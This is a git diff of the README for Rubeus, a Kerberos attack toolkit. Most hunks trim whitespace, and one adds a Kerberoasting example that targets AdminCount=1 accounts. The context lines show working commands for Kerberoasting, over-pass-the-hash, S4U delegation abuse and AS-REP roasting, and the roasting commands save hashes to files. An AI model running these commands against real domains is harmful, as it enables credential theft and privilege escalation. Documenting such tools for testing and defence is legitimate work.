@@ -124,6 +124,9 @@ Rubeus is licensed under the BSD 3-Clause license.
         Perform Kerberoasting, outputting hashes to a file:
             Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
 
+        Perform Kerberoasting selecting only users with AdminCount=1
+            Rubeus.exe kerberoast /admincount
+            
         Perform Kerberoasting with alternate credentials:
             Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
 
@@ -209,7 +212,7 @@ As "everything is stealthy until someone is looking for it", it's arguable wheth
 
 #### Example: Over-pass-the-hash
 
-Say we recover a user's rc4\_hmac hash (NTLM) and want to reuse this credential to compromise an additional machine where the user account has privileged access. 
+Say we recover a user's rc4\_hmac hash (NTLM) and want to reuse this credential to compromise an additional machine where the user account has privileged access.
 
 **Sidenote:** pass-the-hash != over-pass-the-hash. The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn't touch Kerberos at all. The over-pass-the-hash approach was developed by [Benjamin Delpy](https://twitter.com/gentilkiwi) and [Skip Duckwall](https://twitter.com/passingthehash) (see their ["Abusing Microsoft Kerberos - Sorry you guys don't get it"](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18) presentation for more information). This approach turns a hash/key (rc4\_hmac, aes256\_cts\_hmac\_sha1, etc.) for a domain-joined user into a fully-fledged ticket-granting-ticket (TGT).
 
@@ -650,7 +653,7 @@ Then the S4U2proxy abuse function (using the ticket from the previous S4U2self p
 
         doIGujCCBragAwIBBaEDAgEWoo..(snip)..
 
-Where `/ticket:X` is the TGT returned in the first step, and `/tgs` is the S4U2self ticket. Injecting the resulting ticket (manually with [Rubeus.exe ptt /ticket:X](#ptt) or by supplying the `/ptt` flag to the **s4u** command) will allow you access the **ldap** service on primary.testlab.local _as if you are dfm.a_. 
+Where `/ticket:X` is the TGT returned in the first step, and `/tgs` is the S4U2self ticket. Injecting the resulting ticket (manually with [Rubeus.exe ptt /ticket:X](#ptt) or by supplying the `/ptt` flag to the **s4u** command) will allow you access the **ldap** service on primary.testlab.local _as if you are dfm.a_.
 
 The `/altservice` parameter takes advantage of [Alberto Solino](https://twitter.com/agsolino)'s great discovery about [how the service name (sname) is not protected in the KRB-CRED file](https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more), only the server name is. This allows us to substitute in any service name we want in the resulting KRB-CRED (.kirbi) file. One or more alternate service names can be supplied, comma separated (`/altservice:cifs,HOST,...`).
 
@@ -1403,7 +1406,7 @@ Extracting the current user's usable service tickets:
 
      ______        _                      
     (_____ \      | |                     
-     _____) )_   _| |__  _____ _   _  ___ 
+     _____) )_   _| |__  _____ _   _  ___
     |  __  /| | | |  _ \| ___ | | | |/___)
     | |  \ \| |_| | |_) ) ____| |_| |___ |
     |_|   |_|____/|____/|_____)____/(___/
@@ -1458,7 +1461,7 @@ Extracting the current user's usable service tickets:
     AuthenticationPackage    : Negotiate
     LogonType                : Service
     LogonTime                : 2/7/2019 4:51:20 PM
-    LogonServer              : 
+    LogonServer              :
     LogonServerDNSDomain     : testlab.local
     UserPrincipalName        : WINDOWS10$@testlab.local
 
@@ -1961,7 +1964,7 @@ AS-REP roasting all users in the current domain:
 
 
 AS-REP roasting all users in a specific OU, saving the hashes to an output file in Hashcat format:
-    
+
     C:\Rubeus>Rubeus.exe asreproast /ou:OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local /format:hashcat /outfile:C:\Temp\hashes.txt
 
      ______        _
